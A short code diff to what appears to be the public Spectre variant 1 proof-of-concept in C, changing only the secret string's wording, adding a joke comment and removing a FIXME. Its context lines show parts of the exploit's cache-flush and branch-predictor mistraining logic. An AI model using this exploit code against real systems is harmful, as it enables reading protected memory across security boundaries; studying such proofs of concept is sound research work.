@@ -17,7 +17,7 @@ uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
-char *secret = "The Magic Words are Squeamish Ossifrage.";
+char *secret = "The Secret Word are Squeamish Ossifrage.";
 
 uint8_t temp = 0; /* To not optimize out victim_function() */
 
@@ -52,6 +52,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
 		training_x = tries % array1_size;
 		for (j = 29; j >= 0; j--) {
 			_mm_clflush(&array1_size);
+
+			// Just chillin loop
 			for (volatile int z = 0; z < 100; z++) {
 			} /* Delay (can also mfence) */
 
@@ -59,7 +61,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
 			 * or malicious_x if j % 6 == 0 */
 			/* Avoid jumps in case those tip off the branch predictor */
 			/* Set x=FFF.FF0000 if j%6==0, else x=0 */
-			x = ((j % 6) - 1) & ~0xFFFF; // FIXME: is this right?
+			x = ((j % 6) - 1) & ~0xFFFF;
 			/* Set x=-1 if j&6=0, else x=0 */
 			x = (x | (x >> 16));
 			x = training_x ^ (x & (malicious_x ^ training_x));
